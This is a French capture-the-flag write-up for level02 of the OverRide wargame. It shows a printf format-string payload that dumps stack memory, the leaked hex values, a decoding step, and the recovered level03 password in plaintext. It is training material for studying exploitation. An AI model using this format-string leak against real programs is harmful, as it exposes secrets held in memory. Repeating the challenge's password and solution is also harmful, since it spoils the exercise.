En reconstruisant le code on voit que l'on peux afficher le mot de passe du fichier /home/users/level03/.pass car il est stocker en memoire dans une variables du programme.

on va afficher la memoire en passant par le format string de printf

```bash
level02@OverRide:~$ ./level02 < <(python -c 'print "%p " *50')
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe460 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe658 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

Cette portion de la memoire à l'air interressante car elle fait 0x29 octets et dans le code on nous dis que ce qu'il y a dans le fichier fait 0x29 octets.

Chaque portion fait 8 octets car on est sur un programme en 64 bits comme le montre les registres r(ax-di-si-dx-cx-..)

On essaie de déchiffrer cela en Hexadecimal et on inverse le tout.

Le script python le déchiffre et nous sort

```bash
❯ Ressources/decode_hash.py
756e505234376848 unPR47hH
45414a3561733951 EAJ5as9Q
377a7143574e6758 7zqCWNgX
354a35686e475873 5J5hnGXs
48336750664b394d H3gPfK9M
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

On essaie
```bash
level02@OverRide:~$ su level03
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
level03@OverRide:~$ ls
level03
level03@OverRide:~$
``

Validé ✅